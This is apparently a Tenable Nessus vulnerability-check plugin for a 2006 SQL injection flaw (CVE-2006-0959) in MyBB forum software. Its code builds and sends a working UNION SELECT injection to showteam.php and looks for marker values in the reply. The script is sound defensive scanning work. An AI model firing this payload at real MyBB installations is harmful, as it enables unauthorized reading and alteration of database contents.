#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description) {
  script_id(20930);
  script_version("$Revision: 1.18 $");
  script_cvs_date("$Date: 2015/05/22 19:48:53 $");

  script_cve_id("CVE-2006-0959");
  script_bugtraq_id(16631);
  script_osvdb_id(23554);

  script_name(english:"MyBB < 1.04 misc.php SQLi");
  script_summary(english:"Tests a SQL injection issue.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a PHP application that is affected by a
SQL injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of MyBB installed on the remote host is affected by
a SQL injection vulnerability due to improper sanitization of
user-supplied input to the comma variable via the 'comma' parameter in
a cookie. If PHP's 'register_globals' setting is enabled, a remote,
unauthenticated attacker can exploit this issue to manipulate SQL
queries, resulting in the disclosure of sensitive information and
modification of data.

Note that the application is also affected by additional SQL injection
vulnerabilities and multiple cross-site scripting vulnerabilities due
to insufficient validation of user-supplied input. However, Nessus has
not tested for these issues.");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/424942/30/0/threaded");
  script_set_attribute(attribute:"see_also", value:"http://community.mybboard.net/showthread.php?tid=6777");
  script_set_attribute(attribute:"solution", value:"Upgrade to MyBB version 1.04 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2006/02/15");
  script_set_attribute(attribute:"patch_publication_date", value:"2006/02/15");
  script_set_attribute(attribute:"plugin_publication_date", value:"2006/02/16");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:mybb:mybb");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2015 Tenable Network Security, Inc.");

  script_dependencies("mybb_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP", "installed_sw/MyBB");
  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "MyBB";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

magic1 = rand();
magic2 = rand();
exploit = "%20UNION%20SELECT%20" + magic1 + "," + magic2;
for (i=1; i<=57; i++) exploit += ",null";
exploit += ",1,4--";

# Try to exploit flaw.\
url = "/showteam.php?GLOBALS[]=1&comma=-2)" + exploit;
w = http_send_recv3(
  method : "GET",
  item   : dir + url,
  port   : port,
  exit_on_fail : TRUE
);
res = w[2];

# There's a problem if we see our magic numbers in the response.
if (
  "&amp;uid=" + magic1 + '">' >< res &&
  "<b><i>" + magic2 + "</i></b>" >< res
)
{
  output = strstr(res, "&amp;uid=" + magic1 + '">' );
  if (empty_or_null(output)) output = res;

  security_report_v4(
    port       : port,
    severity   : SECURITY_HOLE,
    generic    : TRUE,
    sqli       : TRUE,  # Sets SQLInjection KB key
    request    : make_list(install_url + url),
    output     : chomp(output)
  );
  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
